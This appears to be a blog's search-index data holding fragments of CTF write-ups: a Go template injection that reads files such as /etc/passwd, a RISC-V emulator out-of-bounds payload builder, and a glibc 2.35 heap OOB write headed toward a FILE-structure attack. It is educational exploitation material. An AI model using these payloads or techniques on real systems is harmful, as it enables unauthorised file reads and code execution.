file.Stat() if err != nil { return err } buf := make([]byte, stat.Size()) _, err = file.Read(buf) if err != nil { return err } userTemplate := c.Request().Header.Get(\"Template\") if userTemplate != \"\" { buf = []byte(userTemplate) } c.Set(\"template\", buf) return next(c) } } func handleIndex(c echo.Context) error { tmpl, ok := c.Get(\"template\").([]byte) if !ok { return fmt.Errorf(\"failed to get template\") } tmplStr := string(tmpl) t, err := template.New(\"page\").Parse(tmplStr) if err != nil { return c.String(http.StatusInternalServerError, err.Error()) } buf := new(bytes.Buffer) if err := t.Execute(buf, c); err != nil { return c.String(http.StatusInternalServerError, err.Error()) } return c.HTML(http.StatusOK, buf.String()) } func main() { e := echo.New() e.Use(middleware.Logger()) e.Use(middleware.Recover()) e.GET(\"/\", handleIndex, templateMiddleware) e.Logger.Fatal(e.Start(\":3001\")) } Notice that in templateMiddleware, there is a logic where: If user request header Template is set, it will use the user template instead of the default template. and set it in the echo.Context. And then, in the handleIndex, it will: Fetch the stored Template inside echo.Context Serve the template. And also during serving the template, it injects echo.Context into it. From those codes, we can see the app is vulnerable to Server-Side Template Injection, because we can define our own template. However, there is a WAF that we need to bypass as well if we’re able to read the /flag file because the content of the read file isn’t allowed to contain ACSC. ","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:2:1","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"Exploitation Now that we know the bug, I decided to browse first on how SSTI in Golang works. This article helps me a lot on understanding how the SSTI works. The . scope in the template is coming from the injected echo.Context variable. Basically, what we need to do to solve this challenge is: Find a good method under echo.Context so that we can read the /flag Remove the ACSC string in the flag before returning it. Now, based on that article, it is actually very easy to read a file. We can inject {{ .File \"/etc/passwd\" }} to read a file, because echo.Context interface has File method // File sends a response with the content of the file. File(file string) error However, we can’t do that directly to the /flag because the WAF will prevent it. So, I decided to explore the echo.Context interface one by one. First thing that I notice: echo.Context has Echo() command to get back to the echo instance. So, I try to explore the Echo definition. // Located in echo/echo.go type ( // Echo is the top-level framework instance. // // Goroutine safety: Do not mutate Echo instance fields after server has started. Accessing these // fields from handlers/middlewares and changing field values at the same time leads to data-races. // Adding new routes after the server has been started is also not safe! Echo struct { filesystem common // startupMutex is mutex to lock Echo instance access during server configuration and startup. Useful for to get // listener address info (on which interface/port was listener binded) without having data races. startupMutex sync.RWMutex colorer *color.Color // premiddleware are middlewares that are run before routing is done. In case a pre-middleware returns // an error the router is not executed and the request will end up in the global error handler. premiddleware []MiddlewareFunc middleware []MiddlewareFunc maxParam *int router *Router routers map[string]*Router pool sync.Pool StdLogger *stdLog.Logger Server *http.Server TLSServer *http.Server Listener net.Listener TLSListener net.Listener AutoTLSManager autocert.Manager DisableHTTP2 bool Debug bool HideBanner bool HidePort bool HTTPErrorHandler HTTPErrorHandler Binder Binder JSONSerializer JSONSerializer Validator Validator Renderer Renderer Logger Logger IPExtractor IPExtractor ListenerNetwork string // OnAddRouteHandler is called when Echo adds new route to specific host router. OnAddRouteHandler func(host string, route Route, handler HandlerFunc, middleware []MiddlewareFunc) } ) I saw an interesting field embedded in the Echo struct, which is filesystem. I tried to explore that, and below is the result: // Located in io/fs/fs.go ... // An FS provides access to a hierarchical file system. // // The FS interface is the minimum implementation required of the file system. // A file system may implement additional interfaces, // such as ReadFileFS, to provide additional or optimized functionality. type FS interface { // Open opens the named file. // // When Open returns an error, it should be of type *PathError // with the Op field set to \"open\", the Path field set to name, // and the Err field describing the problem. // // Open should reject attempts to open names that do not satisfy // ValidPath(name), returning a *PathError with Err set to // ErrInvalid or ErrNotExist. Open(name string) (File, error) } // Located in echo/echo_fs.go ... type filesystem struct { // Filesystem is file system used by Static and File handlers to access files. // Defaults to os.DirFS(\".\") // // When dealing with `embed.FS` use `fs := echo.MustSubFS(fs, \"rootDirectory\") to create sub fs which uses necessary // prefix for directory path. This is necessary as `//go:embed assets/images` embeds files with paths // including `assets/images` as their prefix. Filesystem fs.FS } func createFilesystem() filesystem { return filesystem{ Filesystem: newDefaultFS(), } } // defaultFS exists to preserve pre v4.7.0 behaviour where files were open by `os.Open`. // v4.7 introduced `echo.Filesystem` fiel","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:2:2","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"Hardware is not so hard (100 pts) Quote I have captured communication between a SD card and an embedded device. Could you extract the content of the SD Card? It’s in SPI mode. ","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:3:0","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":"Initial Analysis On this challenge, we were given a file spi.txt which contents are like below (redacted because it’s too long): Device to SD Card : 400000000095 SD Card to Device : 01 Device to SD Card : 48000001aa87 SD Card to Device : 01000001aa Device to SD Card : 770000000065 SD Card to Device : 01 Device to SD Card : 694000000077 SD Card to Device : 01 Device to SD Card : 770000000065 SD Card to Device : 01 ... ... ... Device to SD Card : 510000003eff SD Card to Device : 00 SD Card to Device : fffffffffffffffffffffffffe00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 Device to SD Card : 5100000029b3 SD Card to Device : 00 SD Card to Device : fffffffffffffffffffffffffe967bc2730f9a529597a525331c365782c5e1dccf09f2ec8420d931aec4cb62699016b47584ef13b0becb9a64669f2bc162eb84e274b706afc54c702243074898db42bb188688fd0a753e56a1b63b691d83d085de4b97a16af7a1a6266f8ba9887a43ce50b8fc44d833da84d28d4ea3d2fa5f392327a1a1f1385e037c4e3d8c5f0742a85c10272d523d38d34b1912187d6da26e3968cbe0beea7e53d161710a51646ba1fe46ad8858f818b0c5d2c7c4a51b24f05efa975317436275f894621088d05cae1a3136e21387d4fa91c314aaf0d5784f11270b24ee69df10641a13423b09d3827c38c55ea30416ca2d8e94a8f45f65768f7c264253c04b3e1be18904cc1254dbb3050a387574512a1e305c0eec7773e1427c37c41ed5162c8813a6728991ae98345599d1985269fd96d23fb1fd0a737bcf151db45b82d8bc9a54544107f63fb1fd0fe9e34c98620da2e68bbf918d1190825dbc2727076d957627fe9506d968796895a17e263d18641b7d1968af44b46087f41755e613b7af46488ca2b8422fd3060c15157e14a28a29a22a24bd981bd784d264445e15e213befe82ff000c99b070acbde62a4cc53146cfd8d0760efb1a74d3c18a257d11fe0aefd85a88f47fb3fd9af10842108421084e5a1ec7628c096448beb418dde281cd90f01796355f12f86c6427895e1bd75b29595c94bd11611f844d1a6871e8aba2ac836af01649 Based on the problem’s statement, we could deduce that this is the SPI interaction of SD Card. So, I decided to read the specification of SD Card SPI. After googling for a while, I found two good links which is enough to solve this challenge: http://chlazza.nfshost.com/sdcardinfo.html http://www.rjhcoding.com/avrc-sd-interface-4.php So, the first website explain the SD Card SPI Data Transfer Protocol. Basically, the command token format is always 6 bytes, where the specification is: Based on those spec, let’s create a simple script to extract the command and argument from the given spi.txt. Below is the script: f = open(f'spi.txt', 'rb') lines = f.readlines() for line in lines: if b'Device to SD Card : ' in line: full_cmd = int(line.split(b'Device to SD Card : ')[1].strip(), 16) cmd = int(bin(full_cmd)[2:][47-45:47-40], 2) # Based on the protocol specification arg = int(bin(full_cmd)[2:][47-39:47-8], 2) # Based on the protocol specification print(f'CMD: {cmd} | ARG: {arg}') Below is the result (redacted because it’s too long) CMD: 0 | ARG: 0 CMD: 8 | ARG: 426 CMD: 23 | ARG: 0 CMD: 9 | ARG: 1073741824 CMD: 23 | ARG: 0 CMD: 9 | ARG: 1073741824 ... CMD: 17 | ARG: 0 CMD: 17 | ARG: 20 CMD: 17 | ARG: 54 CMD: 17 | ARG: 16 CMD: 17 | ARG: 14 CMD: 17 | ARG: 55 CMD: 17 | ARG: 21 CMD: 17 | ARG: 3 ...","date":"Feb 26, 2023","objectID":"/posts/acsc-2023/:3:1","tags":["Writeup","ACSC","pwn","hardware","ssti","sd-card","heap","libc-2.35","fsop","2023"],"title":"ACSC 2023","uri":"/posts/acsc-2023/"},{"categories":null,"content":" HackTM CTF 2023 This weekend, I spent my time competing at HackTM CTF 2023 held by WreckTheLine with my local team SKSD. We got 28th place. I managed to solve one pwn challenge called CS2100, and this is my writeup for that challenge. CS2100 To all my CS2100 Computer Organisation students, I hope you've enjoyed the lectures thus far on RISC-V assembly. I have set-up an online service for you to test your own RISC-V code! Simply connect to the service through tcp: nc 34.141.16.87 10000 Credit: Thanks to `@fmash16` for his emulator! I didn't even have to compile the emulator binary myself :O https://github.com/fmash16/riscv_emulator/blob/main/main Attachment: https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing ","date":"Feb 19, 2023","objectID":"/posts/hacktm-ctf-2023/:0:0","tags":["Writeup","HackTM","pwn","vm","oob","2023"],"title":"HackTM CTF 2023","uri":"/posts/hacktm-ctf-2023/"},{"categories":null,"content":"Initial Analysis We were given a zip file contains: Binary called main File called server.py Libc binary libc-2.31.so Let’s check the server.py file first #!/usr/bin/env python3 from tempfile import NamedTemporaryFile from subprocess import check_output, Popen, STDOUT, DEVNULL def print_banner(): print(\"\"\" _____ _____ ___ __ ___ ___ / ____|/ ____|__ \\/_ |/ _ \\ / _ \\ | | | (___ ) || | | | | | | | | | \\___ \\ / / | | | | | | | | | |____ ____) |/ /_ | | |_| | |_| | \\_____|_____/|____||_|\\___/ \\___/ \"\"\") def main(): print_banner() s = input(\"Please enter your code (hex-encoded):\\n\") # Remove all whitespace s = ''.join(s.split()) try: d = bytes.fromhex(s) except ValueError: print(\"Invalid hex!\") exit() with NamedTemporaryFile() as temp_file: temp_file.write(d) temp_file.flush() filename = temp_file.name print(\"\\nOutput:\") with Popen([\"./main\", filename], stderr=STDOUT, stdin=DEVNULL) as process: process.wait() if __name__ == \"__main__\": main() Ah okay, so it just read hex-encoded bytecode, stored it in a temporary file, and then pass it to the binary main. The problem description also gives us a link to a github repo. Turn out, the given binary is the compiled version of that repo, which is a riscv emulator. Instead of decompiling the binary, we can just clone the repo and try to analyze the source code. I noticed that this challenge is pretty similar to RealWorld CTF 2023 challenge called tinyvm, where the given repo is a vm of x86 assembly implemented in C, while for this challenge, the repo tries to implement RISC-V emulator. So, based on that experience, I decided to try to look whether there might be Out-of-Bound Read and Write on the given repo, because it is the common mistake of developer during building a simulator. Let’s first inspect the main.c file: ... int main(int argc, char* argv[]) { if (argc != 2) { printf(\"Usage: rvemu \u003cfilename\u003e\\n\"); exit(1); } // Initialize cpu, registers and program counter struct CPU cpu; cpu_init(\u0026cpu); // Read input file read_file(\u0026cpu, argv[1]); // cpu loop while (1) { // fetch uint32_t inst = cpu_fetch(\u0026cpu); // Increment the program counter cpu.pc += 4; // execute if (!cpu_execute(\u0026cpu, inst)) break; dump_registers(\u0026cpu); if(cpu.pc==0) break; } /*dump_registers(\u0026cpu);*/ return 0; } ... Okay, so basically, the file required us to input a filename, which will be loaded to the CPU struct, and then it will iterate the instructions we supplied in the file. Checking the cpu_execute implementation, the emulator implements a lot of RISC-V instructions. int cpu_execute(CPU *cpu, uint32_t inst) { int opcode = inst \u0026 0x7f; // opcode in bits 6..0 int funct3 = (inst \u003e\u003e 12) \u0026 0x7; // funct3 in bits 14..12 int funct7 = (inst \u003e\u003e 25) \u0026 0x7f; // funct7 in bits 31..25 cpu-\u003eregs[0] = 0; // x0 hardwired to 0 at each cycle /*printf(\"%s\\n%#.8lx -\u003e Inst: %#.8x \u003cOpCode: %#.2x, funct3:%#x, funct7:%#x\u003e %s\",*/ /*ANSI_YELLOW, cpu-\u003epc-4, inst, opcode, funct3, funct7, ANSI_RESET); // DEBUG*/ printf(\"%s\\n%#.8lx -\u003e %s\", ANSI_YELLOW, cpu-\u003epc-4, ANSI_RESET); // DEBUG switch (opcode) { case LUI: exec_LUI(cpu, inst); break; case AUIPC: exec_AUIPC(cpu, inst); break; case JAL: exec_JAL(cpu, inst); break; case JALR: exec_JALR(cpu, inst); break; ... } return 1; } Our target is trying to look at an OOB read or write bug. So, I decided to skim for instructions that related to reading/storing value in memory. And then, I noticed this sequence of actions. void exec_SD(CPU* cpu, uint32_t inst) { uint64_t imm = imm_S(inst); uint64_t addr = cpu-\u003eregs[rs1(inst)] + (int64_t) imm; cpu_store(cpu, addr, 64, cpu-\u003eregs[rs2(inst)]); // \u003c- Let's expand this print_op(\"sd\\n\"); } void cpu_store(CPU* cpu, uint64_t addr, uint64_t size, uint64_t value) { bus_store(\u0026(cpu-\u003ebus), addr, size, value); // \u003c- Let's expand this } void bus_store(BUS* bus, uint64_t addr, uint64_t size, uint64_t value) { dram_store(\u0026(bus-\u003edram), addr, size, value); // \u003c- Let's expand this } void dram_store(DRAM* dram, uint64_t addr, uint64_t size, uint64_t value) { switch (size)","date":"Feb 19, 2023","objectID":"/posts/hacktm-ctf-2023/:1:0","tags":["Writeup","HackTM","pwn","vm","oob","2023"],"title":"HackTM CTF 2023","uri":"/posts/hacktm-ctf-2023/"},{"categories":null,"content":"Exploitation Okay, now that we have found our targeted functions during our initial analysis, to help craft the payload easier, I try to build a helper first in python to generate the file that will be passed to the emulator. registers = [ \"zero\", \"ra\", \"sp\", \"gp\", \"tp\", \"t0\", \"t1\", \"t2\", \"s0\", \"s1\", \"a0\", \"a1\", \"a2\", \"a3\", \"a4\", \"a5\", \"a6\", \"a7\", \"s2\", \"s3\", \"s4\", \"s5\", \"s6\", \"s7\", \"s8\", \"s9\", \"s10\", \"s11\", \"t3\", \"t4\", \"t5\", \"t6\", ] register_key = {} for idx, val in enumerate(registers): register_key[val] = idx def reg(key): return register_key[key] def new_inst(opcode, funct3=0, funct7=0, rd=0, rs1=0, rs2=0, imm_i=0, imm_s=0): inst = 2**32 # Set opcode inst |= (opcode \u0026 0x7f) # Set funct3 inst |= ((funct3 \u0026 0x7) \u003c\u003c 12) # Set funct7 inst |= ((funct7 \u0026 0x7f) \u003c\u003c 25) # Set rd inst |= ((rd \u00260x1f) \u003c\u003c 7) # Set rs1 inst |= ((rs1 \u00260x1f) \u003c\u003c 15) # Set rs2 inst |= ((rs2 \u00260x1f) \u003c\u003c 20) # Set imm_i inst |= ((imm_i \u003c\u003c 20) \u0026 0xfff00000) # Set imm_s inst |= ((imm_s \u003c\u003c 20) \u0026 0xfe000000) inst |= ((imm_s \u0026 0x1f) \u003c\u003c 7) return bytes.fromhex(hex(inst \u0026 (2**32-1))[2:].rjust(8, '0'))[::-1].hex() def dram_load_32(hex_str): bytecode = bytes.fromhex(hex_str) inst = bytecode[0] | bytecode[1] \u003c\u003c 8 | bytecode[2] \u003c\u003c 16 | bytecode[3] \u003c\u003c 24 return inst def exec_SD(addr_reg, offset, value): return new_inst(0x23, funct3=0x3, rs1=addr_reg, rs2=value, imm_s=offset) def exec_LD(addr_reg, offset, reg_target): return new_inst(0x03, funct3=0x3, rs1=addr_reg, rd=reg_target, imm_i=offset) def exec_ADDI(target, src, value): return new_inst(0x13, funct3=0x0, rd=target, rs1=src, imm_i=value) def exec_SLLI(target, src, shift): return new_inst(0x13, funct3=0x1, rd=target, rs1=src, imm_i=shift) def exec_SUBW(target, reg_src, reg_src2): return new_inst(0x3b, funct3=0x0, funct7=0x20, rd=target, rs1=reg_src, rs2=reg_src2) The helper above is built based on inspecting how the cpu_execute function processes the instructions bytecode from the input file. Now that we have set the appropriate helper, let’s try to execute it for the first time to build our first payload to test it. Below is the example code that I used during analyzing the code. from pwn import * from tempfile import NamedTemporaryFile payload = '' payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) d = bytes.fromhex(payload) with NamedTemporaryFile() as temp_file: temp_file.write(d) temp_file.flush() filename = temp_file.name print(f'Temp filename: {filename}') pause() After running the above code, it will generate a temp file, and then we can use the temp file to run the main in a separate terminal. Trying to use the generated temp file, below is the example output of the emulator 0x80000000 -\u003e addi zero: 00 s0: 00 a6: 00 s8: 00 ra: 00 s1: 00 a7: 00 s9: 00 sp: 0x80100000 a0: 0x41 s2: 00 s10: 00 gp: 00 a1: 00 s3: 00 s11: 00 tp: 00 a2: 00 s4: 00 t3: 00 t0: 00 a3: 00 s5: 00 t4: 00 t1: 00 a4: 00 s6: 00 t5: 00 t2: 00 a5: 00 s7: 00 t6: 00 We have successfully changed the a0 value to 0x41. Now, notice that the sp register value is 0x80100000. Remember that the max size of array mem is 0x100000, and if we try to access the memory of the address 0x80100000, that means we will try to get the value of mem[addr-DRAM_BASE], which is mem[0x100000]. For example, if we try to increase the sp value by 0x10, that means we have achieved OOB access. Let’s try to check it by using this payload. payload = '' payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SLLI(reg('a0'), reg('a0'), 8) # Shift left \u003c\u003c 8 payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SLLI(reg('a0'), reg('a0'), 8) # Shift left \u003c\u003c 8 payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SLLI(reg('a0'), reg('a0'), 8) # Shift left \u003c\u003c 8 payload += exec_ADDI(reg('a0'), reg('a0'), 0x41) payload += exec_SD(reg('sp'), 0x10, reg('a0')) payload += exec_LD(reg('sp'), 0x58, reg('a1')) # We only add this to set breakpoint in exec_LD, so that we can inspect the memory before the emulator exit The above payload trying to store 0x41414141 to mem[s","date":"Feb 19, 2023","objectID":"/posts/hacktm-ctf-2023/:2:0","tags":["Writeup","HackTM","pwn","vm","oob","2023"],"title":"HackTM CTF 2023","uri":"/posts/hacktm-ctf-2023/"},{"categories":null,"content":" We got 2nd place! Last weekend, I spent my time competing at STACK the Flags CTF 2022 held by GovTech SG with team PDKT then sad. We got 2nd place in the Open Category. Thanks a lot to GovTech SG for the amazing CTF! On this CTF, I managed to solve all of the pwn challenges, and today, I will make a writeup on one of the challenges called Cursed Grimoires, because my solution for that challenge is related to the FILE Structure Attack on the recent GLIBC 2.35 (I’ve made a promise before to continue my FILE Structure Attack series, so I try to make this writeup as detailed as possible during explaining the FILE Structure part). I recommend you to read my first article about FILE Structure Attack in here to get a basic understanding of how FILE Structure Attack works. You can say that this post is like the second part of that article, but focusing only in the glibc 2.35. Cursed Grimoires ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:0:0","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a zip file containing the challenge binary called cursed_grimoires and the libc file that is being used to run the binary. Let’s start the analysis by checking the properties of the binary via checksec. ╰─❯ checksec cursed_grimoires Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled As we can see, the binary: Full RELRO: It means we can’t modify the GOT table. Canary found: It means the binary tries to protect against buffer overflow by storing a canary value in the stack (Which will throw an error if we do buffer overflow and overwrite it with an incorrect value). NX enabled: It means the stack area isn’t executable (We can’t jump to the address in the stack area). PIE enabled: It means the address of the binary’s functions itself will be randomized on each execution. Now, let’s check the libc version ╰─❯ ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35. Okay, the binary used glibc 2.35, which is quite hard to be exploited. Now that we have known the properties, seems like the mitigation are quite strong. Let’s continue our analysis by disassembling the binary methods one by one. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:0","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"main int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int v3; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-8h] v4 = __readfsqword(0x28u); setup_IO(argc, argv, envp); v3 = 0; while ( 1 ) { while ( 1 ) { menu(); printf(\"\\nEnter choice =\u003e \"); __isoc99_scanf(\"%d\", \u0026v3); if ( v3 != 1 ) break; create_grimoire(); } if ( v3 != 2 ) exit(0); edit_grimoire(); } } From the main function, it will call menu() on each iteration, and we can see that there are three menus that we can select based on our choice’s input, create_grimoire, edit_grimoire, and exit. Let’s continue our analysis by disassembling those methods. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:1","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"menu unsigned __int64 menu() { unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); printf(\"\\x1B[2J\\x1B[H\"); puts(s); puts(\"1. Create Grimoire (Only once)\"); puts(\"2. Edit Grimoire\"); puts(\"3. Finish Grimoire\"); return v1 - __readfsqword(0x28u); } Okay, this method just prints the available menus and the number that we should input to choose one of the available menus. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:2","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"create_grimoire unsigned __int64 create_grimoire() { size_t size; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"\\x1B[2J\\x1B[H\"); if ( !GRIMOIRE ) { printf(\"Size of grimoire =\u003e \"); size = 0LL; __isoc99_scanf(\"%zu\", \u0026size); while ( getchar() != 10 ) ; GRIMOIRE = (char *)malloc(size); printf(\"Write your contents =\u003e \"); fgets(GRIMOIRE, size - 1, stdin); } return v2 - __readfsqword(0x28u); } From the disassemble’s result, we can see that the create_grimoire method will do three sequential operations: Check whether the global variable GRIMOIRE is null or not. This means that we can call create_grimoire only one time per execution. Ask for the size of the grimoire, and then it will call malloc to create a new chunk with the input size. Ask for the content of the newly created chunk. One thing that we can notice in this method is that we can set a big size for the chunk that we want to create because there isn’t any restriction. Keep this in mind first because this will be useful later. Let’s move to the edit_grimoire method. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:3","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"edit_grimoire unsigned __int64 edit_grimoire() { char v1; // [rsp+3h] [rbp-Dh] int v2; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v3; // [rsp+8h] [rbp-8h] v3 = __readfsqword(0x28u); printf(\"\\x1B[2J\\x1B[H\"); if ( GRIMOIRE ) { printf(\"Index to edit =\u003e \"); __isoc99_scanf(\"%d\", \u0026v2); while ( getchar() != 10 ) ; printf(\"Replacement =\u003e \"); v1 = getchar(); while ( getchar() != 10 ) ; GRIMOIRE[v2] = v1; } return v3 - __readfsqword(0x28u); } At a glance, we can see that this method will allow us to edit the content of the newly allocated chunk. It will only allow us to edit one char per call (Give the index, and then it will replace the stored value in the given index with the new value that you just gave). If we read this function method carefully, notice that there is a bug in this method. There isn’t any check whether the index that we give is a valid index or not (valid means the index is still inside the allocated chunk’s area). This means that we can do Out-Of-Bounds write on any address that we like, relative to the chunks. To summarize, some important notes that we have taken from our analysis: There are three menus that we can choose (create, edit, and exit). We can allocate one chunk with any size that we want. There is a bug in the edit method which leads us to OOB write on any address that we want (relative to our allocated chunk’s address) ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:1:4","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Exploitation Now, based on those important notes, we need to think about how to abuse the OOB bug that we found so that we can leverage it into Remote-Code-Execution (RCE). Up until now: Even though we have an OOB write, due to ASLR (address randomization), we don’t know the exact address of our created chunk in the heap nor the offset difference between our targeted address with our chunk. ","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:0","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Leveraging the OOB bug with malloc behavior So, what should we do? Remember that in this binary, we are allowed to allocate a chunk of any size. Let’s check the manuals of the malloc. Turns out, there are some interesting notes in the man malloc result. NOTES By default, Linux follows an optimistic memory allocation strategy. This means that when malloc() returns non-NULL there is no guarantee that the memory really is available. In case it turns out that the system is out of memory, one or more processes will be killed by the OOM killer. For more information, see the description of /proc/sys/vm/overcommit_memory and /proc/sys/vm/oom_adj in proc(5), and the Linux kernel source file Documentation/vm/overcommit-accounting.rst. Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2). Based on the notes, if we call malloc() with a big size, it will place our chunk in the mmapped page rather than the heap area. And reading through this article that I found, we can learn that a new page created by mmap will have a consistent offset difference from the libc starting area address. To prove this, let’s fire up our gdb to run the binary multiple time and test it by allocating a chunk with size 1000000. gef➤ x/gx \u0026GRIMOIRE 0x55e0067dd030 \u003cGRIMOIRE\u003e: 0x00007f3b78939010 gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000055e0067d9000 0x000055e0067da000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067da000 0x000055e0067db000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067db000 0x000055e0067dc000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067dc000 0x000055e0067dd000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067dd000 0x000055e0067de000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e0067de000 0x000055e0067df000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055e007bc6000 0x000055e007be7000 0x0000000000000000 rw- [heap] 0x00007f3b78939000 0x00007f3b78a31000 0x0000000000000000 rw- 0x00007f3b78a31000 0x00007f3b78a59000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6 As you can see, the chunk was placed not in the heap, but in a new page created by the mmap, and it was placed just before the libc (The offset difference is 0x00007f3b78a31000 - 0x00007f3b78939010 = 0xf7ff0). Let’s try to run it one more time to confirm it. gef➤ x/gx \u0026GRIMOIRE 0x555555558030 \u003cGRIMOIRE\u003e: 0x00007ffff7c9c010 gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x0000555555559000 0x000055555555a000 0x0000000000005000 rw- /home/chovid99/stf2022/grimories/cursed_grimoires_patched 0x000055555555a000 0x000055555557b000 0x0000000000000000 rw- [heap] 0x00007ffff7c9c000 0x00007ffff7d94000 0x0000000000000000 rw- 0x00007ffff7d94000 0x00007ffff7dbc000 0x0000000000000000 r-- /home/chovid99/stf2022/grimories/libc.so.6 Yup, we can confirm that when we allocated a big chunk, the libc_base_address will be at chunk_address + 0xf7ff0. With this piece of informa","date":"Dec 05, 2022","objectID":"/posts/stack-the-flags-ctf-2022/:2:1","tags":["Writeup","STACK the Flags","pwn","heap","Education","FILE"],"title":"STACK the Flags CTF 2022","uri":"/posts/stack-the-flags-ctf-2022/"},{"categories":null,"content":"Getting a libc leak Now that we have the power to overwrite any writeable area in the loaded libc, what should we do now? Remember that up until now, we don’t have any libc address leak yet. So, it would be a good idea to try finding a way on getting the libc leak. One of the ways that I could think of is using a FILE Structure Attack. If you don’t have any idea or this is your first time hearing about it, I had written some basic knowledge about it in one of my blog’s articles. I believe that reading through that article first will give you a strong fundamental to understand the exploit for this challenge. One of the tricks related to FILE Structure Attack that we could do to leak the libc address is based on this article. The article explained the trick on leaking the libc, but I will try to break it down one by one again based on what I did to understand the article. Remember that the menu() function will be called on each iteration and it calls puts. So, based on the previous article, if we deep dive into the implementation of puts in the glibc source code, we will get a way to get a libc leak. Let’s start breaking it down one by one starting from the puts method itself. int _IO_puts (const char *str) { int result = EOF; size_t len = strlen (str); _IO_acquire_lock (stdout); if ((_IO_vtable_offset (stdout) != 0 || _IO_fwide (stdout, -1) == -1) \u0026\u0026 _IO_sputn (stdout, str, len) == len \u0026\u0026 _IO_putc_unlocked ('\\n', stdout) != EOF) result = MIN (INT_MAX, len + 1); _IO_release_lock (stdout); return result; 